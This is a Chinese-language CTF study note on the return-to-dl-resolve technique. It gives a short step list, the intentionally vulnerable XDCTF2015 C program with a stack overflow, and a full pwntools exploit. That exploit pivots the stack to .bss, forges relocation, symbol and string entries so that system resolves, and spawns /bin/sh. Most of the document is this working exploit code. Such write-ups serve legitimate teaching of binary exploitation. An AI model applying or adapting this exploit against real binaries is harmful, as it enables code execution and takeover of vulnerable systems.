# Return-to-dl-resolve
&#8195;参加大佬的讲解，非常非常的详细！！！这里简单总结为如下的内容，主要需要了解动态重定向的过程。其实感觉这样一步一步的fake，貌似还更容易理解<br>
&#8195;1、通过栈溢出，构造rop，向bss段某位置写入数据<br>
&#8195;2、将栈地址改向bss段<br>
&#8195;3、写入正常的shellcode，使用write输出‘/bin/sh’（通过write plt）<br>
&#8195;4、修改为通过plt 0，给出reloc的偏移<br>
&#8195;5、构造假的重定向表，给出在动态链接符号表中的偏移<br>
&#8195;6、构造假的dynsym，给出在字符串表中的偏移<br>
&#8195;7、构造所需函数的字符串名字，改变参数<br>


## vuln code
```
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln()
{
    char buf[100];
    setbuf(stdin, buf);
    read(0, buf, 256);
}
int main()
{
    char buf[100] = "Welcome to XDCTF2015~!\n";

    setbuf(stdout, buf);
    write(1, buf, strlen(buf));
    vuln();
    return 0;
}
```

## exp

```
from pwn import *
import time,sys,binascii

elf_name = "./bof"
elf = ELF(elf_name)

io = process( elf_name )
gdb.attach(io, "b *0x08048535")

write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = 0x0804A020

bss_addr = 0x0804a040
stack_size = 0x800
bss_stage = bss_addr + stack_size

ppp_ret = 0x080485cc
pop_ebp_ret = 0x080485ce
leave_ret = 0x08048468
#write_offset = 0x28

payload1 = 'a' * 112
payload1 += p32(read_plt)
payload1 += p32(ppp_ret)
payload1 += p32(0)
payload1 += p32(bss_stage)
payload1 += p32(0x100)
payload1 += p32(pop_ebp_ret)
payload1 += p32(bss_stage)
payload1 += p32(leave_ret)
payload1 += 'a' * (0x100 - len(payload1))
io.send(payload1)

dynsym = 0x080481d8
dynstr = 0x08048278

plt_0 = 0x08048390  #objdump -d -j .plt bof
rel_plt = 0x08048330 # objdump -s -j .rel.plt bof
r_index = (bss_stage + 28) - rel_plt

align = (0x10 - (bss_stage + 36 - dynsym) & 0xf)
fake_sym_addr = bss_stage + 36 + align
sym_index = (fake_sym_addr - dynsym) / 0x10

r_offset = write_got
r_info = (sym_index << 8) | 0x7
fake_reloc = p32(r_offset) + p32(r_info)

str_addr = fake_sym_addr + 0x10
str_offset = str_addr - dynstr
fake_sym = p32(str_offset) + p32(0x0) + p32(0x0) + p32(0x12)


cmd = '/bin/sh'
payload2 = 'aaaa'
payload2 += p32(plt_0)
payload2 += p32(r_index)
payload2 += 'aaaa'
payload2 += p32(bss_stage + 0x80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc
payload2 += 'a' * align
payload2 += fake_sym
payload2 += 'system' + '\x00'
payload2 += 'a' * (0x80 - len(payload2))
payload2 += cmd + '\x00'
payload2 += 'a' * (0x100 - len(payload2))

io.send(payload2)

io.interactive()

```

## 参考资料
32位： http://pwn4.fun/2016/11/09/Return-to-dl-resolve/ <br>
64位： http://www.freebuf.com/articles/system/149364.html
